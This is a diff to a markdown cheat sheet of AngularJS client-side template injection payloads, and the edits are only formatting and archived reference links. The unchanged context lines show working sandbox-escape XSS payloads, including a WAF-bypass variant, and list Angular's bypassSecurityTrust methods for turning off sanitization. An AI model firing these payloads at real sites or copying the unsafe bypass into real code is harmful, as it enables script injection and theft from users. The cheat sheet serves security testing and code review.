@@ -9,7 +9,6 @@
 * [Automatic Sanitization](#automatic-sanitization)
 * [References](#references)
 
-
 ## Client Side Template Injection
 
 The following payloads are based on Client Side Template Injection.
@@ -32,9 +31,7 @@ AngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746
 {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
 ```
 
-Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
-
-AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
+AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) and [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
 
 ```javascript
 {{0[a='constructor'][a]('alert(1)')()}}
@@ -205,7 +202,6 @@ AngularJS bypass Waf [Imperva]
 }}
 ```
 
-
 Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)
 
 ```javascript
@@ -304,11 +300,11 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 
 However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:
 
-- bypassSecurityTrustHtml
-- bypassSecurityTrustScript
-- bypassSecurityTrustStyle
-- bypassSecurityTrustUrl
-- bypassSecurityTrustResourceUrl
+* bypassSecurityTrustHtml
+* bypassSecurityTrustScript
+* bypassSecurityTrustStyle
+* bypassSecurityTrustUrl
+* bypassSecurityTrustResourceUrl
 
 Example of a component using the unsecure method `bypassSecurityTrustUrl`:
 
@@ -336,11 +332,10 @@ export class App {
 
 When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.
 
-
 ## References
 
-- [Angular Security - May 16, 2023](https://angular.io/guide/security)
-- [Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson (@MtnBer) - July 11, 2024](https://matanber.com/blog/4-char-csti)
-- [Blind XSS AngularJS Payloads - Lewis Ardern - December 7, 2018](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)
-- [Bypass DomSanitizer - Swarna (@swarnakishore) - August 11, 2017](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
-- [XSS without HTML - CSTI with Angular JS - Gareth Heyes (@garethheyes) - January 27, 2016](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
+* [Angular Security - May 16, 2023](https://angular.io/guide/security)
+* [Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson (@MtnBer) - July 11, 2024](https://web.archive.org/web/20250118075113/https://matanber.com/blog/4-char-csti)
+* [Blind XSS AngularJS Payloads - Lewis Ardern - December 7, 2018](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)
+* [Bypass DomSanitizer - Swarna (@swarnakishore) - August 11, 2017](https://web.archive.org/web/20250908023652/https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
+* [XSS without HTML - CSTI with Angular JS - Gareth Heyes (@garethheyes) - January 27, 2016](https://web.archive.org/web/20190331015852/https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
